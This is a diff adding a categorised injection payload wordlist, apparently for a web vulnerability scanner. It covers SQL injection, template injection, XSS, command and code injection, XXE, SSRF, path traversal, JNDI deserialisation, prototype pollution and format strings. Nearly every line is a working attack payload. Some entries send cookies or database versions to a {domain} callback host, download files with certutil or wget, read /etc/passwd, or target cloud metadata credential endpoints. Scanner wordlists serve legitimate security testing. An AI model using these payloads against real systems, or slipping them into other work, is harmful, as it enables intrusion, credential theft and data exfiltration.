@@ -1,0 +1,1483 @@
+##POLYGLOT - SQLi Cross-Dialect (Timing)##
+SLEEP(5)/*'XOR(IF(1=1,SLEEP(5),0))OR'"XOR(IF(1=1,SLEEP(5),0))OR"*/
+1;WAITFOR DELAY '0:0:5'--/*'OR SLEEP(5) OR'1'='1*/"OR pg_sleep(5)--
+1)OR(SLEEP(5))OR('/**/')OR(BENCHMARK(5000000,SHA1('a')))OR("/**/")OR(pg_sleep(5))--
+'AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))OR'1'='1/*"AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--*/
+'))OR SLEEP(5) OR(('/*'))OR pg_sleep(5)--*/')OR LIKE('A',UPPER(HEX(RANDOMBLOB(500000000/2))))--
+##POLYGLOT - SQLi Cross-Dialect (Error)##
+'AND 1=CONVERT(int,@@version)--/*'OR 1=extractvalue(1,concat(0x7e,version()))--*/"OR CAST(version() AS int)--
+1'OR updatexml(1,concat(0x7e,(SELECT version())),1)OR'"OR 1=CONVERT(int,(SELECT @@version))OR"--
+')OR(1=CAST(version() AS int))OR('/**/OR extractvalue(1,concat(0x7e,version()))OR")--
+##POLYGLOT - SQLi Cross-Dialect (Math: 1337)##
+'UNION SELECT 7*191--/*'UNION SELECT 7*191,7*191--*/"UNION SELECT 7*191,7*191,7*191--
+')UNION SELECT 7*191,NULL,NULL,NULL--/*')UNION SELECT 7*191,NULL--*/")UNION SELECT 7*191--
+*/UNION SELECT 7*191--/*'UNION ALL SELECT 7*191--*/"UNION SELECT 7*191--
+##POLYGLOT - SQLi Cross-Dialect (OOB)##
+';EXEC master..xp_dirtree '\\{domain}\a'--/*'OR LOAD_FILE('\\\\{domain}\\a')OR'*/"OR(SELECT dblink_send_query('host={domain}','SELECT 1'))--
+1;COPY(SELECT '')TO PROGRAM 'nslookup {domain}'--/*'UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.{domain}\\a'))--*/"--
+';DECLARE @q VARCHAR(1024);SET @q='\\'+@@version+'.{domain}\a';EXEC master..xp_dirtree @q--
+##POLYGLOT - SSTI Cross-Engine (Math: 1337)##
+{{7*191}}${7*191}<%= 7*191 %>${{7*191}}#{7*191}#set($x=7*191)$x[=7*191]@(7*191)[[${7*191}]]
+{{7*'191'}}${7*191}#{7*191}<%= 7*191 %>${{7*191}}{% set x=7*191 %}{{x}}[#assign x=7*191]${x}
+{{7*191}}${7*191}{{=7*191}}<%=7*191%>#{7*191}${{7*191}}${T(java.lang.Math).abs(1337)}
+##POLYGLOT - SSTI Cross-Engine (Timing)##
+{{__import__('time').sleep(5)}}${T(java.lang.Thread).sleep(5000)}<%= sleep(5) %>${{T(java.lang.Thread).sleep(5000)}}#{sleep(5)}
+{% set x=__import__('time').sleep(5) %}#{sleep(5)}${{T(java.lang.Thread).sleep(5000)}}[[${T(java.lang.Thread).sleep(5000)}]]
+##POLYGLOT - SSTI Cross-Engine (OOB)##
+{{__import__('urllib.request').request.urlopen('http://{domain}/ssti')}}${T(java.net.URL).new('http://{domain}/ssti').openStream()}<%= require('net/http');Net::HTTP.get(URI('http://{domain}/ssti')) %>${{T(java.net.URL).new('http://{domain}/ssti').openStream()}}
+{% set x=__import__('urllib.request').request.urlopen('http://{domain}/ssti') %}#{require('net/http');Net::HTTP.get(URI('http://{domain}/ssti'))}${{T(java.net.URL).new('http://{domain}/ssti').openStream()}}
+##POLYGLOT - SSTI Cross-Engine (Error)##
+${{<%[%'"}}%\
+{{.}}${.}<%= nil.x %>#{.}${{.}}{% invalid %}[#invalid/]@{invalid}
+##POLYGLOT - XSS Cross-Context##
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1337) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1337)//>\x3e
+'"><img src=x onerror=alert(1337)><!--
+'"/><svg/onload=alert(1337)//><script>alert(1337)</script><!--
+--></script>"><img/src=x onerror=alert(1337)><svg/onload=alert(1337)>{{1337}}${1337}<%= 1337 %>
+javascript:alert(1337)//";alert(1337)//';alert(1337)//`alert(1337)`//--></script><img src=x onerror=alert(1337)>
+##POLYGLOT - XSS Blind/OOB##
+'"><script src=//{domain}/x.js></script><img src=//{domain}/x onerror=alert(1337)><!--
+'"><img src=x onerror="fetch('//{domain}/'+document.cookie);alert(1337)"><svg/onload=fetch('//{domain}/')><!--
+--></script>'"><img src=x onerror="new Image().src='//{domain}/?c='+document.cookie;alert(1337)"><!--
+##POLYGLOT - OS Command Injection Cross-Shell (Timing)##
+;sleep 5 #'|sleep 5|"$(sleep 5)`sleep 5`
+&timeout /T 5&;sleep 5;'|sleep 5 #"|timeout 5|`sleep 5`
+||sleep 5&&sleep 5;sleep 5|sleep 5\n$(sleep 5)\n`sleep 5`
+##POLYGLOT - OS Command Injection Cross-Shell (OOB)##
+;nslookup {domain} #'|nslookup {domain}|"$(nslookup {domain})`nslookup {domain}`
+&ping -c1 {domain}&;curl {domain};'|curl {domain} #"|wget {domain}|`nslookup {domain}`
+||nslookup {domain}||&certutil -urlcache -f http://{domain}/x x&;wget -q http://{domain};
+##POLYGLOT - OS Command Injection Cross-Shell (Math: 1337)##
+;echo $((7*191)) #'|expr 7 \* 191|"$(echo $((7*191)))`expr 7 \* 191`
+&set /a 7*191&;echo $((7*191));'|python3 -c "print(7*191)"|`echo $((7*191))`
+##POLYGLOT - Code Injection Cross-Language (Math: 1337)##
+7*191
+eval('7*191')
+(7*191)
+int(1337.0)
+abs(-1337)
+##POLYGLOT - Code Injection Cross-Language (Timing)##
+__import__('time').sleep(5)
+sleep(5)
+require('child_process').execSync('sleep 5')
+java.lang.Thread.sleep(5000)
+select(undef,undef,undef,5)
+##POLYGLOT - Code Injection Cross-Language (OOB)##
+__import__('urllib.request').request.urlopen('http://{domain}/pyeval')
+require('http').get('http://{domain}/nodeeval')
+file_get_contents('http://{domain}/phpeval')
+require 'net/http';Net::HTTP.get(URI('http://{domain}/rbeval'))
+use IO::Socket::INET;IO::Socket::INET->new(PeerAddr=>'{domain}',PeerPort=>9999)
+new java.net.URL('http://{domain}/javaeval').openStream()
+##POLYGLOT - NoSQL Injection##
+{"$gt":"","$ne":""}
+[$ne]=1&[$gt]=&[$regex]=.*
+{"$where":"sleep(5)||this.a==1"}
+';return true;var x='\\';return this.a=='
+{"$or":[{"a":{"$gt":""}},{"a":{"$regex":".*"}}],"$comment":"'\""}
+##POLYGLOT - XXE##
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{domain}/xxe">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://{domain}/evil.dtd">%dtd;%payload;]><foo>&exfil;</foo>
+<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY a "1337">]><foo>&a;</foo>
+##POLYGLOT - SSRF##
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://metadata.google.internal/computeMetadata/v1/
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://[::ffff:127.0.0.1]/
+http://0x7f000001/
+http://0177.0.0.1/
+http://127.1/
+http://{domain}/ssrf
+gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
+dict://127.0.0.1:6379/INFO
+file:///etc/passwd
+##POLYGLOT - Path Traversal##
+../../../../../../../etc/passwd
+..\..\..\..\..\..\..\windows\win.ini
+..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
+....//....//....//....//....//etc/passwd
+..%00/..%00/..%00/..%00/etc/passwd%00.jpg
+/%5C../%5C../%5C../%5C../%5C../etc/passwd
+..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
+##POLYGLOT - Deserialization##
+${jndi:ldap://{domain}/a}
+${jndi:rmi://{domain}/a}
+${jndi:dns://{domain}/a}
+O:8:"stdClass":1:{s:4:"evil";s:19:"system('id');die();";}
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('nslookup {domain}')}()"}
+##POLYGLOT - Prototype Pollution##
+__proto__[polluted]=1337
+constructor[prototype][polluted]=1337
+{"__proto__":{"polluted":1337}}
+{"constructor":{"prototype":{"polluted":1337}}}
+__proto__.polluted=1337&constructor.prototype.polluted=1337
+##POLYGLOT - EL Injection Cross-Engine##
+${7*191}#{7*191}%{7*191}@{7*191}${{7*191}}
+${T(java.lang.Runtime).getRuntime().exec('nslookup {domain}')}#{T(java.lang.Runtime).getRuntime().exec('nslookup {domain}')}
+${applicationScope}#{facesContext.externalContext.requestHeaderMap}%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']}
+##POLYGLOT - Header/CRLF Injection##
+%0d%0aX-Injected:1337%0d%0a
+%0d%0aSet-Cookie:x=1337%0d%0a%0d%0a<script>alert(1337)</script>
+\r\nX-Injected:1337\r\nHost:evil.com
+##POLYGLOT - Format String (C/C++/ObjC)##
+%s%s%s%s%s%s%s%s%s%s
+%x%x%x%x%x%x%x%x%x%x
+%p%p%p%p%p%p%p%p%p%p
+%n%n%n%n%n%n%n%n%n%n
+AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
+%d%d%d%d%d%d%d%d%d%d
+%s(un='%s')=%u
+%.1337x
+%1337d
+%1337$x
+%1337$n
+%1337$s
+%*.*s
+%@%@%@%@
+##POLYGLOT - Python Format String Injection##
+{0.__class__.__mro__[1].__subclasses__()}
+{0.__class__}
+{0.__init__.__globals__}
+{0.__class__.__init__.__globals__[os].popen(id).read()}
+##POLYGLOT - .NET Format String Injection##
+{0}
+{0:X}
+{0}{1}{2}{3}{4}{5}{6}{7}{8}{9}
+{0:R}
+##POLYGLOT - Buffer Overflow - Error##
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n%n%n%n%n%n%n%n
+%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+##POLYGLOT - Integer Boundary - Error##
+' AND 1=CAST(2147483648 AS int)--
+' AND 1=CAST(9999999999999999999 AS int)--
+' AND 1=CAST(1e309 AS int)--
+' OR 1/0--
+' AND 1=CAST(-2147483649 AS int)--
+eval("Number.MAX_SAFE_INTEGER+1")
+eval("parseInt('9'.repeat(999))")
+##POLYGLOT - Integer Boundary - Reflected##
+0
+-1
+1
+2147483647
+2147483648
+-2147483648
+-2147483649
+4294967295
+4294967296
+9999999999999999999
+-9999999999999999999
+0x7FFFFFFF
+0x80000000
+0xFFFFFFFF
+0x100000000
+32767
+32768
+-32768
+-32769
+65535
+65536
+127
+128
+-128
+-129
+255
+256
+1e308
+1e309
+-1e308
+-1e309
+NaN
+Infinity
+-Infinity
+1.7976931348623157e+308
+5e-324
+-0
+##POLYGLOT - Type Confusion - Error##
+' AND 1=undefined--
+eval("undefined.property")
+eval("null.toString()")
+eval("({}).nonexistent()")
+eval("[][0]()")
+eval("[null][0].toString()")
+##POLYGLOT - Type Confusion - Reflected##
+undefined
+undef
+null
+NULL
+(null)
+nil
+NIL
+None
+true
+false
+True
+False
+TRUE
+FALSE
+0.0
+-0.0
+""
+''
+[]
+{}
+[null]
+{"":""}
+##POLYGLOT - Null Byte - Error##
+test%00'OR'1'='1
+%00<script>alert(1337)</script>
+../../../etc/passwd%00.jpg
+test\0' AND 1=CAST(1 AS int)--
+##POLYGLOT - Null Byte - Reflected##
+%00
+\0
+\x00
+\u0000
+%00%00%00%00
+test%00admin
+test\0admin
+
+##SQLi - Error-Based##
+'AND 1=CAST(0x41 AS int)--
+"AND 1=CAST(0x41 AS int)--
+')AND 1=CAST(0x41 AS int)--
+'))AND 1=CAST(0x41 AS int)--
+*/AND 1=CAST(0x41 AS int)--
+'AND 1=CONVERT(int,@@version)--
+"AND 1=CONVERT(int,@@version)--
+')AND 1=CONVERT(int,@@version)--
+1 AND 1=CONVERT(int,@@version)--
+'AND extractvalue(1,concat(0x7e,version()))#
+"AND extractvalue(1,concat(0x7e,version()))#
+')AND extractvalue(1,concat(0x7e,version()))#
+'))AND extractvalue(1,concat(0x7e,version()))#
+*/AND extractvalue(1,concat(0x7e,version()))#
+'AND updatexml(1,concat(0x7e,version()),1)#
+"AND updatexml(1,concat(0x7e,version()),1)#
+')AND updatexml(1,concat(0x7e,version()),1)#
+1 AND updatexml(1,concat(0x7e,version()),1)#
+'AND exp(~(SELECT*FROM(SELECT version())a))#
+"AND exp(~(SELECT*FROM(SELECT version())a))#
+')AND exp(~(SELECT*FROM(SELECT version())a))#
+'AND 1=CAST((SELECT version()) AS int)--
+"AND 1=CAST((SELECT version()) AS int)--
+')AND 1=CAST((SELECT version()) AS int)--
+1 AND 1=CAST((SELECT version()) AS int)--
+'AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
+"AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
+'AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x)#
+"AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x)#
+')AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x)#
+'AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)#
+"AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)#
+'AND GTID_SUBSET(version(),1)#
+'OR 1 GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)) HAVING MIN(0)#
+"OR 1 GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)) HAVING MIN(0)#
+'AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(version())) USING utf8)))#
+1 AND extractvalue(1,concat(0x7e,(SELECT version())))--
+1 AND updatexml(1,concat(0x7e,(SELECT version())),1)--
+'AND 1=CAST(version() AS numeric)--
+"AND 1=CAST(version() AS numeric)--
+')AND 1=CAST(version() AS numeric)--
+'||(SELECT ''||DBMS_UTILITY.SQLID_TO_SQLHASH('a') FROM dual)||'
+"OR 1=TO_NUMBER('a')--
+'OR 1=UTL_INADDR.GET_HOST_NAME('invalid')--
+'AND 1=CTXSYS.DRITHSX.SN(1,'a')--
+'OR 1=ORDSYS.ORD_DICOM.GETMAPPINGXPATH('a','a','a')--
+##SQLi - Math-Based (Canary: 1337)##
+'UNION SELECT 7*191--
+'UNION SELECT 7*191#
+"UNION SELECT 7*191--
+)UNION SELECT 7*191--
+'))UNION SELECT 7*191--
+'UNION SELECT 7*191,NULL--
+'UNION SELECT NULL,7*191--
+"UNION SELECT 7*191,NULL--
+'UNION SELECT 7*191,NULL,NULL--
+'UNION SELECT NULL,7*191,NULL--
+'UNION SELECT NULL,NULL,7*191--
+'UNION SELECT 7*191,NULL,NULL,NULL--
+'UNION SELECT NULL,7*191,NULL,NULL--
+'UNION SELECT NULL,NULL,7*191,NULL--
+'UNION SELECT NULL,NULL,NULL,7*191--
+'UNION SELECT 7*191,NULL,NULL,NULL,NULL--
+'UNION SELECT NULL,7*191,NULL,NULL,NULL--
+'UNION SELECT 7*191,NULL,NULL,NULL,NULL,NULL--
+'UNION SELECT NULL,7*191,NULL,NULL,NULL,NULL--
+'AND 1=(SELECT 7*191)--
+"AND 1=(SELECT 7*191)--
+')AND 1=(SELECT 7*191)--
+'OR 7*191=1337--
+"OR 7*191=1337--
+')OR 7*191=1337--
+'AND 7*191=1337 AND '1'='1
+"AND 7*191=1337 AND "1"="1
+')AND 7*191=1337 AND ('1'='1
+'))AND 7*191=1337 AND (('1'='1
+*/AND 7*191=1337--
+'UNION ALL SELECT 7331/1--
+'UNION ALL SELECT 7331/1,NULL--
+'UNION ALL SELECT NULL,7331/1--
+##SQLi - Timing-Based##
+'OR SLEEP(5)#
+"OR SLEEP(5)#
+')OR SLEEP(5)#
+'))OR SLEEP(5)#
+*/OR SLEEP(5)#
+1 OR SLEEP(5)#
+'AND SLEEP(5)#
+"AND SLEEP(5)#
+'AND SLEEP(5) AND '1'='1
+"AND SLEEP(5) AND "1"="1
+'OR BENCHMARK(5000000,SHA1('a'))#
+"OR BENCHMARK(5000000,SHA1('a'))#
+')OR BENCHMARK(5000000,SHA1('a'))#
+1 OR BENCHMARK(5000000,SHA1('a'))#
+'AND IF(1=1,SLEEP(5),0)#
+"AND IF(1=1,SLEEP(5),0)#
+')AND IF(1=1,SLEEP(5),0)#
+1 AND IF(1=1,SLEEP(5),0)#
+'XOR(IF(1=1,SLEEP(5),0))XOR'Z
+"XOR(IF(1=1,SLEEP(5),0))XOR"Z
+0'XOR(IF(1=1,SLEEP(5),0))XOR'Z
+(SELECT(0)FROM(SELECT(SLEEP(5)))v)/*'+(SELECT(0)FROM(SELECT(SLEEP(5)))v)+'"+(SELECT(0)FROM(SELECT(SLEEP(5)))v)+"*/
+';WAITFOR DELAY '0:0:5'--
+";WAITFOR DELAY '0:0:5'--
+');WAITFOR DELAY '0:0:5'--
+'));WAITFOR DELAY '0:0:5'--
+*/;WAITFOR DELAY '0:0:5'--
+1;WAITFOR DELAY '0:0:5'--
+1);WAITFOR DELAY '0:0:5'--
+'AND 1=(SELECT 1 FROM(SELECT WAITFOR DELAY '0:0:5')a)--
+"AND 1=(SELECT 1 FROM(SELECT WAITFOR DELAY '0:0:5')a)--
+')AND 1=(SELECT 1 FROM(SELECT WAITFOR DELAY '0:0:5')a)--
+'OR 1=(SELECT 1 WHERE 1=1 WAITFOR DELAY '0:0:5')--
+"OR 1=(SELECT 1 WHERE 1=1 WAITFOR DELAY '0:0:5')--
+';IF(1=1) WAITFOR DELAY '0:0:5'--
+";IF(1=1) WAITFOR DELAY '0:0:5'--
+');IF(1=1) WAITFOR DELAY '0:0:5'--
+1;IF(1=1) WAITFOR DELAY '0:0:5'--
+'OR(SELECT pg_sleep(5))::text='1
+"OR(SELECT pg_sleep(5))::text="1
+')OR(SELECT pg_sleep(5))IS NOT NULL--
+'))OR(SELECT pg_sleep(5))IS NOT NULL--
+*/OR(SELECT pg_sleep(5))IS NOT NULL--
+1 OR(SELECT pg_sleep(5))IS NOT NULL--
+'AND(SELECT pg_sleep(5))IS NOT NULL--
+"AND(SELECT pg_sleep(5))IS NOT NULL--
+'AND(SELECT pg_sleep(5))IS NOT NULL AND '1'='1
+';SELECT pg_sleep(5)--
+";SELECT pg_sleep(5)--
+');SELECT pg_sleep(5)--
+1;SELECT pg_sleep(5)--
+'||(SELECT pg_sleep(5))||'
+'AND 1=(SELECT CASE WHEN 1=1 THEN(SELECT pg_sleep(5)) ELSE 1 END)--
+"AND 1=(SELECT CASE WHEN 1=1 THEN(SELECT pg_sleep(5)) ELSE 1 END)--
+'AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+"AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+')AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+'OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+"OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+'AND 1=DBMS_LOCK.SLEEP(5)--
+"AND 1=DBMS_LOCK.SLEEP(5)--
+')AND 1=DBMS_LOCK.SLEEP(5)--
+1 AND 1=DBMS_LOCK.SLEEP(5)--
+'||DBMS_PIPE.RECEIVE_MESSAGE('a',5)||'
+'AND 1=(SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END FROM dual)--
+'AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--
+"AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--
+')AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--
+1 AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--
+'OR RANDOMBLOB(500000000/2)--
+"OR RANDOMBLOB(500000000/2)--
+IF(1=1,SLEEP(5),0)/*'XOR(IF(1=1,SLEEP(5),0))OR'"XOR(IF(1=1,SLEEP(5),0))OR"*/
+(SELECT(0)FROM(SELECT(SLEEP(5)))v)/*'XOR(IF(1=1,SLEEP(5),0))OR'"XOR(IF(1=1,SLEEP(5),0))OR"*/
+SLEEP(5)/*'OR SLEEP(5) OR'"OR SLEEP(5) OR"*/
+1 AND(SELECT 1 FROM(SELECT SLEEP(5))a)/*'AND(SELECT 1 FROM(SELECT SLEEP(5))a) AND'1'='1"AND(SELECT 1 FROM(SELECT SLEEP(5))a) AND"1"="1*/
+'AND(SELECT CASE WHEN(1=1)THEN SLEEP(5) ELSE 1 END)/*"AND(SELECT CASE WHEN(1=1)THEN SLEEP(5) ELSE 1 END)*/--
+0'XOR(if(now()=sysdate(),SLEEP(5),0))XOR'Z/*"XOR(if(now()=sysdate(),SLEEP(5),0))XOR"Z*/
+##SQLi - OOB (Out-of-Band)##
+'AND LOAD_FILE(CONCAT('\\\\',version(),'.{domain}\\a'))#
+"AND LOAD_FILE(CONCAT('\\\\',version(),'.{domain}\\a'))#
+')AND LOAD_FILE(CONCAT('\\\\',version(),'.{domain}\\a'))#
+1 AND LOAD_FILE(CONCAT('\\\\',version(),'.{domain}\\a'))#
+'UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.{domain}\\a'))#
+'UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.{domain}\\a')),NULL#
+'AND(SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.{domain}\\a')))#
+';SELECT LOAD_FILE(CONCAT('\\\\',version(),'.{domain}\\a'))#
+';EXEC master..xp_dirtree '\\{domain}\a'--
+";EXEC master..xp_dirtree '\\{domain}\a'--
+');EXEC master..xp_dirtree '\\{domain}\a'--
+1;EXEC master..xp_dirtree '\\{domain}\a'--
+';EXEC master..xp_dirtree '\\'+@@version+'.{domain}\a'--
+";EXEC master..xp_dirtree '\\'+@@version+'.{domain}\a'--
+';EXEC master..xp_fileexist '\\{domain}\a'--
+";EXEC master..xp_fileexist '\\{domain}\a'--
+1;DECLARE @q VARCHAR(1024);SET @q='\\'+@@version+'.{domain}\a';EXEC master..xp_dirtree @q--
+';COPY (SELECT version()) TO PROGRAM 'nslookup {domain}'--
+";COPY (SELECT version()) TO PROGRAM 'nslookup {domain}'--
+');COPY (SELECT version()) TO PROGRAM 'nslookup {domain}'--
+1;COPY (SELECT version()) TO PROGRAM 'nslookup {domain}'--
+';SELECT dblink_connect('host={domain} user=a password=a dbname=a')--
+";SELECT dblink_connect('host={domain} user=a password=a dbname=a')--
+';COPY (SELECT '') TO PROGRAM 'curl http://{domain}/'--
+';COPY (SELECT '') TO PROGRAM 'wget http://{domain}/'--
+'AND 1=UTL_HTTP.REQUEST('http://{domain}/'||version)--
+"AND 1=UTL_HTTP.REQUEST('http://{domain}/'||version)--
+')AND 1=UTL_HTTP.REQUEST('http://{domain}/'||version)--
+1 AND 1=UTL_HTTP.REQUEST('http://{domain}/')--
+'OR 1=UTL_INADDR.GET_HOST_ADDRESS('{domain}')--
+"OR 1=UTL_INADDR.GET_HOST_ADDRESS('{domain}')--
+'AND 1=HTTPURITYPE('http://{domain}/').GETCLOB()--
+"AND 1=HTTPURITYPE('http://{domain}/').GETCLOB()--
+'||(SELECT UTL_HTTP.REQUEST('http://{domain}/'||user) FROM dual)||'
+'||(SELECT HTTPURITYPE('http://{domain}/').GETCLOB() FROM dual)||'
+';SELECT UTL_HTTP.REQUEST('http://{domain}/') FROM dual--
+##PostgreSQL Error-Based##
+' AND 1=CAST(version() AS int)--
+' AND 1=CAST(current_database() AS int)--
+' AND 1=CAST(current_user AS int)--
+') AND 1=CAST(version() AS int)--
+##SQLite Error-Based##
+' AND 1=invalidfunc()--
+' AND 1=CAST('abc' AS INTEGER)--
+' AND typeof(invalid_col)--
+##CockroachDB Time-Based##
+' AND pg_sleep(5) IS NOT NULL--
+
+##SSTI - Error-Based##
+{{invalid}}
+${invalid}
+<%= invalid %>
+{%invalid%}
+{% invalid %}
+{{.invalid}}
+${T(invalid)}
+{{constructor.constructor("invalid")()}}
+${invalid.class}
+{{invalid|safe}}
+{%- invalid -%}
+${{<%[%'"}}%\}}
+${${{<%[%'"}}%\}
+{{''.__class__.__mro__[2].__subclasses__()[999]}}
+<%= undefined_method_xyz %>
+${T(java.lang.Runtime).invalidMethod()}
+{{range.invalid}}
+{{7*'a]}}
+${"invalid"?no_such_builtin}
+{%%}
+{{%}}
+<%=%>
+##SSTI - Math-Based (Canary: 1337)##
+{{7*191}}
+${7*191}
+<%= 7*191 %>
+${{7*191}}
+{{7*191}}${7*191}<%= 7*191 %>${{7*191}}#{7*191}
+<#assign x=7*191>${x}
+${T(java.lang.Math).addExact(1330,7)}
+{{7*191}}//
+'}}{{7*191}}//
+"}}{{7*191}}//
+}}{{7*191}}
+{{7*191}}{{7*191}}
+${7*191}${{7*191}}
+<%= 7 * 191 %>
+{{(7)*191}}
+${{(7)*(191)}}
+{{7*191|safe}}
+{%set x=7*191%}{{x}}
+${(7*191)?c}
+{{=7*191}}
+{{7*191}}${{7*191}}<%= 7*191 %>#{7*191}${7*191}
+{{config.__class__.__init__.__globals__['__builtins__']['eval']('7*191')}}
+${(7*191)}
+<%=7*191%>
+{{{7*191}}}
+{{7*191}}{%comment%}{%endcomment%}
+a]}}{{7*191}}
+{{7*191}}/*
+*/{{7*191}}
+<%= (7)*(191) %>
+${(7)*(191)}
+${{7*191}}//
+a]${7*191}
+{{7*191}}${{<%[%'7*191}}%\
+{{range.Repeat 1337}}A{{end}}
+##SSTI - Timing-Based##
+{{config.__class__.__init__.__globals__['__builtins__']['__import__']('time').sleep(5)}}
+{{lipsum.__globals__['__builtins__']['__import__']('time').sleep(5)}}
+{{cycler.__init__.__globals__['__builtins__']['__import__']('time').sleep(5)}}
+{{joiner.__init__.__globals__['__builtins__']['__import__']('time').sleep(5)}}
+{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('time').sleep(5)}}
+{{request.application.__globals__.__builtins__.__import__('time').sleep(5)}}
+{{self._TemplateReference__context.cycler.__init__.__globals__['__builtins__']['__import__']('time').sleep(5)}}
+${__import__("time").sleep(5)}
+<%import time;time.sleep(5)%>
+<%= sleep(5) %>
+<%= Kernel.sleep(5) %>
+{{['5']|filter('sleep')}}
